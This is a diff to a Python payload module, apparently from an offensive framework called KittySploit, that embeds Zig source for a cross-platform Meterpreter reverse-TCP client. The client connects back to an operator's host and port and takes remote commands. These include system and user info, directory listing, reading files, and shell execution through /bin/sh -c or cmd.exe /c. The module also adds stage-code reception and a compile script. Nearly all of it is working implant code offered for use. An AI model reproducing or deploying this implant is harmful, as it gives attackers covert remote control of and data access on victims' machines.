@@ -4,7 +4,7 @@
 """
 Zig Meterpreter Reverse TCP Payload
 Author: KittySploit Team
-Version: 1.0.0
+Version: 1.1.0
 
 This payload generates a Zig-based Meterpreter client that can be compiled
 cross-platform. Zig allows easy cross-compilation for multiple architectures
@@ -24,10 +24,10 @@ class Module(Payload):
         'name': 'Zig Meterpreter, Reverse TCP',
         'description': 'Meterpreter payload in Zig - cross-platform compilation (requires Zig compiler)',
         'author': 'KittySploit Team',
-        'version': '1.0.0',
+        'version': '1.1.0',
         'category': 'singles',
         'platform': Platform.UNIX,
-        'arch': Arch.X64,  # Zig supports multiple architectures
+        'arch': Arch.X64,
         'listener': 'listeners/multi/meterpreter',
         'handler': Handler.REVERSE,
         'session_type': SessionType.METERPRETER,
@@ -82,12 +82,15 @@ const MeterpreterClient = struct {
         var self = Self{
             .host = host,
             .port = port,
-            .current_dir = try process.getCwdAlloc(allocator),
+            .current_dir = "",
             .is_root = false,
             .username = "user",
             .hostname = "localhost",
             .allocator = allocator,
         };
+        
+        const cwd = try process.getCwdAlloc(allocator);
+        self.current_dir = cwd;
 
         if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) {
             self.is_root = (posix.getuid() == 0);
@@ -95,12 +98,10 @@ const MeterpreterClient = struct {
 
         if (builtin.target.os.tag == .windows) {
             if (process.getEnvVarOwned(allocator, "USERNAME")) |username| {
-                defer allocator.free(username);
-                self.username = try allocator.dupe(u8, username);
+                self.username = username;
             } else |_| {}
             if (process.getEnvVarOwned(allocator, "COMPUTERNAME")) |hostname| {
-                defer allocator.free(hostname);
-                self.hostname = try allocator.dupe(u8, hostname);
+                self.hostname = hostname;
             } else |_| {}
         } else {
             if (posix.getenv("USER")) |user| {
@@ -184,33 +185,32 @@ const MeterpreterClient = struct {
         }
     }
 
-    pub fn sendResponse(self: *Self, output: []const u8, status: i32, error_msg: []const u8) !void {
+    pub fn sendResponse(self: *Self, output: []const u8, status: i32, err_msg: []const u8) !void {
         if (self.socket_fd == null) return;
 
-        const response_bytes = try json.Stringify.valueAlloc(self.allocator, .{
+        const response_bytes = try json.stringifyAlloc(self.allocator, .{
             .output = output,
             .status = status,
-            .error_msg = error_msg,
+            .@"error" = err_msg,
         }, .{});
         defer self.allocator.free(response_bytes);
-        const length: u32 = @intCast(response_bytes.len);
+        
+        var length_buf: [4]u8 = undefined;
+        mem.writeInt(u32, &length_buf, @intCast(response_bytes.len), .big);
 
-        const length_bytes = mem.asBytes(&length);
         if (builtin.target.os.tag == .windows) {
             const ws2_32 = os.windows.ws2_32;
             const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
-            const sent1 = ws2_32.send(sock, length_bytes.ptr, @intCast(length_bytes.len), 0);
-            if (sent1 == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
-            const sent2 = ws2_32.send(sock, response_bytes.ptr, @intCast(response_bytes.len), 0);
-            if (sent2 == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
+            _ = ws2_32.send(sock, &length_buf, 4, 0);
+            _ = ws2_32.send(sock, response_bytes.ptr, @intCast(response_bytes.len), 0);
         } else {
             const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
-            _ = try posix.send(fd, length_bytes, 0);
+            _ = try posix.send(fd, &length_buf, 0);
             _ = try posix.send(fd, response_bytes, 0);
         }
     }
 
-    pub fn receiveCommand(self: *Self) !?Command {
+    pub fn receiveCommand(self: *Self) !?json.Parsed(Command) {
         if (self.socket_fd == null) return null;
 
         var length_bytes: [4]u8 = undefined;
@@ -255,9 +255,7 @@ const MeterpreterClient = struct {
             }
         }
 
-        var parsed = try json.parseFromSlice(Command, self.allocator, command_data, .{});
-
-        return parsed.value;
+        return try json.parseFromSlice(Command, self.allocator, command_data, .{ .ignore_unknown_fields = true });
     }
 
     pub fn executeCommand(self: *Self, cmd: []const u8, args: []const []const u8) !CommandResult {
@@ -275,8 +273,6 @@ const MeterpreterClient = struct {
             return self.cmdLs(args);
         } else if (mem.eql(u8, cmd, "cat")) {
             return self.cmdCat(args);
-        } else if (mem.eql(u8, cmd, "execute")) {
-            return self.cmdExecute(args);
         } else if (mem.eql(u8, cmd, "ps")) {
             return self.cmdPs();
         } else {
@@ -285,14 +281,14 @@ const MeterpreterClient = struct {
     }
 
     fn cmdSysinfo(self: *Self) !CommandResult {
-        var output = std.array_list.Managed(u8).init(self.allocator);
+        var output = std.ArrayList(u8).init(self.allocator);
         defer output.deinit();
 
-        try output.print("Computer\\t\\t: {s}\\n", .{self.hostname});
-        try output.print("OS\\t\\t\\t: {s}\\n", .{@tagName(builtin.target.os.tag)});
-        try output.print("Architecture\\t\\t: {s}\\n", .{@tagName(builtin.target.cpu.arch)});
-        try output.print("Meterpreter\\t\\t: Zig\\n", .{});
-        try output.print("Zig Version\\t\\t: {s}\\n", .{"0.12.0"});
+        try output.writer().print("Computer\t\t: {s}\n", .{self.hostname});
+        try output.writer().print("OS\t\t\t: {s}\n", .{@tagName(builtin.target.os.tag)});
+        try output.writer().print("Architecture\t\t: {s}\n", .{@tagName(builtin.target.cpu.arch)});
+        try output.writer().print("Meterpreter\t\t: Zig\n", .{});
+        try output.writer().print("Zig Version\t\t: {s}\n", .{"0.16.0-dev"});
 
         return CommandResult{
             .output = try output.toOwnedSlice(),
@@ -302,14 +298,14 @@ const MeterpreterClient = struct {
     }
 
     fn cmdGetuid(self: *Self) !CommandResult {
-        var output = std.array_list.Managed(u8).init(self.allocator);
+        var output = std.ArrayList(u8).init(self.allocator);
         defer output.deinit();
 
         const uid: u32 = if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) 
             posix.getuid() 
         else 
             1000;
-        try output.print("Server username: {s} ({d})\\n", .{ self.username, uid });
+        try output.writer().print("Server username: {s} ({d})\n", .{ self.username, uid });
 
         return CommandResult{
             .output = try output.toOwnedSlice(),
@@ -319,16 +315,14 @@ const MeterpreterClient = struct {
     }
 
     fn cmdGetpid(self: *Self) !CommandResult {
-        var output = std.array_list.Managed(u8).init(self.allocator);
+        var output = std.ArrayList(u8).init(self.allocator);
         defer output.deinit();
 
         const pid: i32 = if (builtin.target.os.tag == .windows) 
-            @intCast(os.windows.GetCurrentProcessId())
-        else if (builtin.target.os.tag == .linux)
-            @intCast(os.linux.getpid())
+            @intCast(os.windows.kernel32.GetCurrentProcessId())
         else
-            @intCast(os.linux.getpid());
-        try output.print("Current pid: {d}\\n", .{pid});
+            @intCast(posix.getpid());
+        try output.writer().print("Current pid: {d}\n", .{pid});
 
         return CommandResult{
             .output = try output.toOwnedSlice(),
@@ -338,10 +332,10 @@ const MeterpreterClient = struct {
     }
 
     fn cmdPwd(self: *Self) !CommandResult {
-        var output = std.array_list.Managed(u8).init(self.allocator);
+        var output = std.ArrayList(u8).init(self.allocator);
         defer output.deinit();
 
-        try output.print("{s}\\n", .{self.current_dir});
+        try output.writer().print("{s}\n", .{self.current_dir});
 
         return CommandResult{
             .output = try output.toOwnedSlice(),
@@ -358,43 +352,38 @@ const MeterpreterClient = struct {
         if (args.len == 0) {
             if (builtin.target.os.tag == .windows) {
                 if (process.getEnvVarOwned(self.allocator, "USERPROFILE")) |home| {
-                    defer self.allocator.free(home);
-                    target_dir_owned = try self.allocator.dupe(u8, home);
+                    target_dir_owned = home;
                     target_dir = target_dir_owned.?;
                 } else |_| {
-                    target_dir_owned = try self.allocator.dupe(u8, "C:\\\\Users\\\\user");
-                    target_dir = target_dir_owned.?;
+                    target_dir = "C:\\Users";
                 }
             } else {
                 if (posix.getenv("HOME")) |home| {
-                    target_dir_owned = try self.allocator.dupe(u8, home);
-                    target_dir = target_dir_owned.?;
+                    target_dir = home;
                 } else {
-                    target_dir_owned = try self.allocator.dupe(u8, "/home/user");
-                    target_dir = target_dir_owned.?;
+                    target_dir = "/tmp";
                 }
             }
         } else {
             target_dir = args[0];
         }
 
-        const full_path = if (mem.startsWith(u8, target_dir, "/"))
+        const absolute_target = if (std.fs.path.isAbsolute(target_dir))
             try self.allocator.dupe(u8, target_dir)
         else
-            try std.fmt.allocPrint(self.allocator, "{s}/{s}", .{ self.current_dir, target_dir });
-        defer self.allocator.free(full_path);
+            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, target_dir });
+        defer self.allocator.free(absolute_target);
 
-        var dir = std.fs.cwd().openDir(full_path, .{}) catch {
+        std.fs.cwd().access(absolute_target, .{}) catch {
             return CommandResult{
                 .output = "",
                 .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "cd: {s}: No such file or directory", .{full_path}),
+                .error_msg = try std.fmt.allocPrint(self.allocator, "cd: {s}: No such file or directory", .{absolute_target}),
             };
         };
-        dir.close();
 
         self.allocator.free(self.current_dir);
-        self.current_dir = try self.allocator.dupe(u8, full_path);
+        self.current_dir = try self.allocator.dupe(u8, absolute_target);
         return CommandResult{
             .output = "",
             .status = 0,
@@ -404,12 +393,13 @@ const MeterpreterClient = struct {
 
     fn cmdLs(self: *Self, args: []const []const u8) !CommandResult {
         const target_dir_raw = if (args.len == 0) self.current_dir else args[0];
-        const target_dir = if (mem.startsWith(u8, target_dir_raw, "/"))
+        const target_dir = if (std.fs.path.isAbsolute(target_dir_raw))
             target_dir_raw
         else
-            try std.fmt.allocPrint(self.allocator, "{s}/{s}", .{ self.current_dir, target_dir_raw });
+            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, target_dir_raw });
+        defer if (!std.fs.path.isAbsolute(target_dir_raw)) self.allocator.free(target_dir);
 
-        var dir = std.fs.cwd().openDir(target_dir, .{}) catch {
+        var dir = std.fs.cwd().openDir(target_dir, .{ .iterate = true }) catch {
             return CommandResult{
                 .output = "",
                 .status = 1,
@@ -418,19 +408,16 @@ const MeterpreterClient = struct {
         };
         defer dir.close();
 
-        var output = std.array_list.Managed(u8).init(self.allocator);
+        var output = std.ArrayList(u8).init(self.allocator);
         defer output.deinit();
 
         var iter = dir.iterate();
         while (try iter.next()) |entry| {
             const name = entry.name;
             if (entry.kind == .directory) {
-                try output.print("{s}/\\n", .{name});
+                try output.writer().print("{s}/\n", .{name});
             } else {
-                const file = try dir.openFile(name, .{});
-                defer file.close();
-                const stat = try file.stat();
-                try output.print("{s} ({d} bytes)\\n", .{ name, stat.size });
+                try output.writer().print("{s}\n", .{name});
             }
         }
 
@@ -450,16 +437,17 @@ const MeterpreterClient = struct {
             };
         }
 
-        const file_path = if (mem.startsWith(u8, args[0], "/"))
+        const file_path = if (std.fs.path.isAbsolute(args[0]))
             args[0]
         else
-            try std.fmt.allocPrint(self.allocator, "{s}/{s}", .{ self.current_dir, args[0] });
+            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, args[0] });
+        defer if (!std.fs.path.isAbsolute(args[0])) self.allocator.free(file_path);
 
-        const content = std.fs.cwd().readFileAlloc(file_path, self.allocator, .unlimited) catch {
+        const content = std.fs.cwd().readFileAlloc(file_path, self.allocator, 10 * 1024 * 1024) catch {
             return CommandResult{
                 .output = "",
                 .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "cat: {s}: No such file", .{file_path}),
+                .error_msg = try std.fmt.allocPrint(self.allocator, "cat: {s}: No such file or error reading", .{file_path}),
             };
         };
 
@@ -479,58 +467,34 @@ const MeterpreterClient = struct {
             };
         }
 
-        var cmd_args = std.array_list.Managed([]const u8).init(self.allocator);
+        var cmd_args = std.ArrayList([]const u8).init(self.allocator);
         defer cmd_args.deinit();
 
-        var it = mem.splitScalar(u8, args[0], ' ');
-        while (it.next()) |arg| {
-            if (arg.len > 0) {
-                try cmd_args.append(arg);
-            }
+        if (builtin.target.os.tag == .windows) {
+            try cmd_args.append("cmd.exe");
+            try cmd_args.append("/c");
+            try cmd_args.append(args[0]);
+        } else {
+            try cmd_args.append("/bin/sh");
+            try cmd_args.append("-c");
+            try cmd_args.append(args[0]);
         }
         
         var child = std.process.Child.init(cmd_args.items, self.allocator);
         child.cwd = self.current_dir;
-        child.stdin_behavior = .Ignore;
         child.stdout_behavior = .Pipe;
         child.stderr_behavior = .Pipe;
-        child.spawn() catch |err| {
-            return CommandResult{
-                .output = "",
-                .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "execute error: {s}", .{@errorName(err)}),
-            };
-        };
-        var stdout_list = std.ArrayList(u8).empty;
-        var stderr_list = std.ArrayList(u8).empty;
         
-        child.collectOutput(self.allocator, &stdout_list, &stderr_list, 1024 * 1024) catch |err| {
-            return CommandResult{
-                .output = "",
-                .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "execute error: {s}", .{@errorName(err)}),
-            };
-        };
+        try child.spawn();
         
-        const result = child.wait() catch |err| {
-            stdout_list.deinit(self.allocator);
-            stderr_list.deinit(self.allocator);
-            return CommandResult{
-                .output = "",
-                .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "execute error: {s}", .{@errorName(err)}),
-            };
-        };
+        const stdout = try child.stdout.?.readToEndAlloc(self.allocator, 1024 * 1024);
+        const stderr = try child.stderr.?.readToEndAlloc(self.allocator, 1024 * 1024);
         
-        const exit_code: i32 = switch (result) {
+        const term = try child.wait();
+        const exit_code: i32 = switch (term) {
             .Exited => |code| @intCast(code),
             else => 1,
         };
-        
-        const stdout = try self.allocator.dupe(u8, stdout_list.items);
-        const stderr = try self.allocator.dupe(u8, stderr_list.items);
-        stdout_list.deinit(self.allocator);
-        stderr_list.deinit(self.allocator);
         
         return CommandResult{
             .output = stdout,
@@ -540,78 +504,99 @@ const MeterpreterClient = struct {
     }
 
     fn cmdPs(self: *Self) !CommandResult {
-        var child = std.process.Child.init(&[_][]const u8{ "ps", "aux" }, self.allocator);
-        child.stdin_behavior = .Ignore;
-        child.stdout_behavior = .Pipe;
-        child.stderr_behavior = .Pipe;
-        child.spawn() catch |err| {
-            return CommandResult{
-                .output = "",
-                .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "ps error: {s}", .{@errorName(err)}),
-            };
-        };
-        var stdout_list = std.ArrayList(u8).empty;
-        var stderr_list = std.ArrayList(u8).empty;
-        
-        child.collectOutput(self.allocator, &stdout_list, &stderr_list, 1024 * 1024) catch |err| {
-            return CommandResult{
-                .output = "",
-                .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "ps error: {s}", .{@errorName(err)}),
-            };
-        };
-        
-        const result = child.wait() catch |err| {
-            stdout_list.deinit(self.allocator);
-            stderr_list.deinit(self.allocator);
-            return CommandResult{
-                .output = "",
-                .status = 1,
-                .error_msg = try std.fmt.allocPrint(self.allocator, "ps error: {s}", .{@errorName(err)}),
-            };
-        };
-        
-        const exit_code: i32 = switch (result) {
-            .Exited => |code| @intCast(code),
-            else => 1,
-        };
-        
-        const stdout = try self.allocator.dupe(u8, stdout_list.items);
-        const stderr = try self.allocator.dupe(u8, stderr_list.items);
-        stdout_list.deinit(self.allocator);
-        stderr_list.deinit(self.allocator);
+        return self.cmdExecute(&[_][]const u8{ if (builtin.target.os.tag == .windows) "tasklist" else "ps aux" });
+    }
 
-        return CommandResult{
-            .output = stdout,
-            .status = exit_code,
-            .error_msg = stderr,
-        };
+    pub fn receiveStageCode(self: *Self) !void {
+        if (self.socket_fd == null) return;
+        
+        const fd_val = self.socket_fd.?;
+        var length_bytes: [4]u8 = undefined;
+        var bytes_read: usize = 0;
+        
+        if (builtin.target.os.tag == .windows) {
+            const ws2_32 = os.windows.ws2_32;
+            const sock = @as(ws2_32.SOCKET, @ptrFromInt(fd_val));
+            
+            var timeout: i32 = 2000;
+            _ = ws2_32.setsockopt(sock, ws2_32.SOL_SOCKET, ws2_32.SO_RCVTIMEO, @ptrCast(&timeout), 4);
+
+            bytes_read = 0;
+            while (bytes_read < 4) {
+                const n = ws2_32.recv(sock, length_bytes[bytes_read..].ptr, @intCast(4 - bytes_read), 0);
+                if (n == ws2_32.SOCKET_ERROR) {
+                    const err_code = ws2_32.WSAGetLastError();
+                    if (err_code == 10060 or err_code == 10035) return;
+                    return error.ConnectionFailed;
+                }
+                if (n == 0) return;
+                bytes_read += @intCast(n);
+            }
+            
+            const stage_length = mem.readInt(u32, &length_bytes, .big);
+            if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
+                var stage_buf = try self.allocator.alloc(u8, stage_length);
+                defer self.allocator.free(stage_buf);
+                
+                bytes_read = 0;
+                while (bytes_read < stage_length) {
+                    const recv_n = ws2_32.recv(sock, stage_buf[bytes_read..].ptr, @intCast(stage_length - bytes_read), 0);
+                    if (recv_n <= 0) break;
+                    bytes_read += @intCast(recv_n);
+                }
+            }
+            
+            timeout = 0;
+            _ = ws2_32.setsockopt(sock, ws2_32.SOL_SOCKET, ws2_32.SO_RCVTIMEO, @ptrCast(&timeout), 4);
+        } else {
+            const fd = @as(posix.fd_t, @intCast(fd_val));
+            
+            const flags = try posix.fcntl(fd, posix.F.GETFL, 0);
+            _ = try posix.fcntl(fd, posix.F.SETFL, flags | posix.O.NONBLOCK);
+            defer _ = posix.fcntl(fd, posix.F.SETFL, flags) catch {};
+            
+            bytes_read = 0;
+            const n = posix.recv(fd, &length_bytes, 0) catch |err| {
+                if (err == error.WouldBlock) return;
+                return err;
+            };
+            if (n < 4) return;
+            
+            const stage_length = mem.readInt(u32, &length_bytes, .big);
+            _ = try posix.fcntl(fd, posix.F.SETFL, flags);
+            
+            if (stage_length > 0 and stage_length < 50 * 1024 * 1024) {
+                var stage_buf = try self.allocator.alloc(u8, stage_length);
+                defer self.allocator.free(stage_buf);
+                
+                bytes_read = 0;
+                while (bytes_read < stage_length) {
+                    const recv_n = try posix.recv(fd, stage_buf[bytes_read..], 0);
+                    if (recv_n == 0) break;
+                    bytes_read += recv_n;
+                }
+            }
+        }
     }
 
     pub fn run(self: *Self) !void {
         try self.connect();
+        self.receiveStageCode() catch {};
 
         while (true) {
-            const command = try self.receiveCommand() orelse break;
+            var parsed = try self.receiveCommand() orelse break;
+            defer parsed.deinit();
 
-            if (mem.eql(u8, command.command, "exit")) {
-                break;
-            }
+            const cmd_obj = parsed.value;
+            if (mem.eql(u8, cmd_obj.command, "exit")) break;
 
-            const result = try self.executeCommand(command.command, command.args);
+            const result = self.executeCommand(cmd_obj.command, cmd_obj.args) catch |err| {
+                try self.sendResponse("", 1, @errorName(err));
+                continue;
+            };
             try self.sendResponse(result.output, result.status, result.error_msg);
-        }
-
-        if (self.socket_fd) |fd_val| {
-            if (builtin.target.os.tag == .windows) {
-                const ws2_32 = os.windows.ws2_32;
-                const sock = @as(ws2_32.SOCKET, @ptrFromInt(fd_val));
-                _ = ws2_32.closesocket(sock);
-            } else {
-                const sock = @as(posix.fd_t, @intCast(fd_val));
-                posix.close(sock);
-            }
+            self.allocator.free(result.output);
+            if (result.error_msg.len > 0) self.allocator.free(result.error_msg);
         }
     }
 };
@@ -628,7 +613,7 @@ const CommandResult = struct {
 };
 
 pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{.safety = false}){};
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
@@ -639,10 +624,12 @@ pub fn main() !void {
     const port = if (args.len > 2) try fmt.parseInt(u16, args[2], 10) else 4444;
 
     var client = try MeterpreterClient.init(allocator, host, port);
-    try client.run();
+    client.run() catch |err| {
+        std.log.err("client run failed: {}", .{err});
+    };
 }
 """
-    
+
     def generate(self):
         """Generate the Zig Meterpreter payload"""
         try:
@@ -650,51 +637,33 @@ pub fn main() !void {
             print_info(f"Target: {self.target_os}-{self.target_arch}")
             print_info(f"Connect to: {self.lhost}:{self.lport}")
             
-            # Use embedded Zig source code
             zig_source = self.ZIG_SOURCE_CODE
             
-            # Determine output directory - use output/ like other framework outputs
             platform_dir = self._get_platform_dir(self.target_os)
-            
-            # Use output directory with platform/arch structure
             if self.output_dir:
                 output_path = Path(self.output_dir)
             else:
-                # Default: output/zig_meterpreter/<platform>/<arch>/
                 output_path = Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
             
             output_path.mkdir(parents=True, exist_ok=True)
-            print_info(f"Binary output directory: {output_path}")
-            
-            # Save source file in src subdirectory (for compilation reference)
             src_dir = output_path / "src"
             src_dir.mkdir(parents=True, exist_ok=True)
             output_source = src_dir / "meterpreter.zig"
             with open(output_source, 'w', encoding='utf-8') as f:
                 f.write(zig_source)
             
-            print_info(f"Source code saved to: {output_source}")
-            
-            # Determine binary name and path
             binary_name = self._get_binary_name(self.target_os)
             binary_path = output_path / binary_name
             
-            # Generate compilation instructions
-            compile_instructions = self._generate_compile_instructions(str(output_source), str(binary_path))
-            
             # Save compilation script
+            compile_instructions = self._generate_compile_instructions(str(output_source), str(binary_path))
             compile_script = output_path / "compile.sh"
             with open(compile_script, 'w', encoding='utf-8') as f:
                 f.write(compile_instructions)
             
-            # Make script executable (Unix)
             if os.name != 'nt':
                 os.chmod(compile_script, 0o755)
             
-            print_success(f"Compilation script saved to: {compile_script}")
-            print_info(f"Binary will be saved to: {binary_path}")
-            
-            # Auto-compile if requested
             if self.auto_compile:
                 print_info("Auto-compiling...")
                 if self._compile():
@@ -706,56 +675,32 @@ pub fn main() !void {
 
         except Exception as e:
             print_error(f"Error generating Zig payload: {e}")
-            import traceback
-            traceback.print_exc()
             return None
     
     def _get_platform_dir(self, target_os: str) -> str:
-        """Get platform directory name"""
         platform_map = {
-            'linux': 'linux',
-            'windows': 'windows',
-            'macos': 'mac',
-            'freebsd': 'freebsd',
-            'netbsd': 'netbsd',
-            'openbsd': 'openbsd',
-            'dragonfly': 'dragonfly'
+            'linux': 'linux', 'windows': 'windows', 'macos': 'mac',
+            'freebsd': 'freebsd', 'netbsd': 'netbsd', 'openbsd': 'openbsd', 'dragonfly': 'dragonfly'
         }
         return platform_map.get(target_os.lower(), target_os.lower())
     
     def _get_binary_name(self, target_os: str) -> str:
-        """Get binary name based on OS"""
-        if target_os.lower() == 'windows':
-            return 'meterpreter.exe'
-        else:
-            return 'meterpreter'
+        return 'meterpreter.exe' if target_os.lower() == 'windows' else 'meterpreter'
     
     def _generate_compile_instructions(self, source_path: str, binary_path: str) -> str:
-        """Generate compilation instructions"""
         target = f"{self.target_os}-{self.target_arch}"
         opt_flag = f"-O{self.optimization}"
         binary_name = os.path.basename(binary_path)
         source_name = os.path.basename(source_path)
         source_dir = os.path.dirname(source_path)
         
-        instructions = f"""#!/bin/bash
+        return f"""#!/bin/bash
 # Zig Meterpreter Compilation Script
 # Target: {target}
 # Optimization: {self.optimization}
 # Binary: {binary_path}
 
 echo "Compiling Zig Meterpreter for {target}..."
-echo "Source: {source_path}"
-echo "Output: {binary_path}"
-
-# Check if Zig is installed
-if ! command -v zig &> /dev/null; then
-    echo "Error: Zig compiler not found!"
-    echo "Install Zig from: https://ziglang.org/download/"
-    exit 1
-fi
-
-# Compile (Zig doesn't support --output-dir, so we compile then move)
 cd "{source_dir}"
 binary_name_no_ext=$(basename "{binary_name}" .exe)
 zig build-exe {source_name} \\
@@ -765,8 +710,6 @@ zig build-exe {source_name} \\
     --name "$binary_name_no_ext"
 
 if [ $? -eq 0 ]; then
-    # Find and move the compiled binary
-    # Zig may add .exe extension on Windows
     compiled_binary=""
     for name in "{binary_name}" "$binary_name_no_ext" "$binary_name_no_ext.exe"; do
         if [ -f "$name" ]; then
@@ -774,19 +717,9 @@ if [ $? -eq 0 ]; then
             break
         fi
     done
-    
     if [ -n "$compiled_binary" ]; then
         mv "$compiled_binary" "{binary_path}"
         echo "✓ Compilation successful!"
-        echo "Binary: {binary_path}"
-        echo ""
-        echo "To run on target:"
-        if [[ "{self.target_os}" == "windows" ]]; then
-            echo "  {binary_name} {self.lhost} {self.lport}"
-        else
-            echo "  chmod +x {binary_name}"
-            echo "  ./{binary_name} {self.lhost} {self.lport}"
-        fi
     else
         echo "✗ Compiled binary not found!"
         exit 1
@@ -796,35 +729,19 @@ else
     exit 1
 fi
 """
-        return instructions
     
     def _compile(self) -> bool:
-        """Compile the Zig payload using the framework's compilation function"""
         try:
-            # Determine output directory (same logic as generate)
             platform_dir = self._get_platform_dir(self.target_os)
-            if self.output_dir:
-                output_path = Path(self.output_dir)
-            else:
-                output_path = Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
-                output_path.mkdir(parents=True, exist_ok=True)
-            
+            output_path = Path(self.output_dir) if self.output_dir else Path("output") / "zig_meterpreter" / platform_dir / self.target_arch
             binary_name = self._get_binary_name(self.target_os)
             binary_path = output_path / binary_name
-            
-            # Read source code (already saved in src/)
             source_file = output_path / "src" / "meterpreter.zig"
-            if not source_file.exists():
-                print_error(f"Source file not found: {source_file}")
-                return False
             
             with open(source_file, 'r', encoding='utf-8') as f:
                 zig_source = f.read()
             
-            # Use the framework's compile_zig function from BaseModule/Payload
-            print_info(f"Compiling Zig Meterpreter for {self.target_os}-{self.target_arch}...")
-            
-            success = self.compile_zig(
+            return self.compile_zig(
                 source_code=zig_source,
                 output_path=str(binary_path),
                 target_platform=self.target_os,
@@ -833,25 +750,8 @@ fi
                 strip=True,
                 static=True
             )
-            
-            if success and binary_path.exists():
-                size = binary_path.stat().st_size
-                print_info(f"Binary size: {size} bytes")
-                return True
-            
+        except Exception:
             return False
-                
-        except Exception as e:
-            print_error(f"Compilation error: {e}")
-            import traceback
-            traceback.print_exc()
-            return False
-    
     
     def run(self):
-        """Run the payload generation"""
-        result = self.generate()
-        if result:
-            return True
-        return False
-
+        return self.generate()
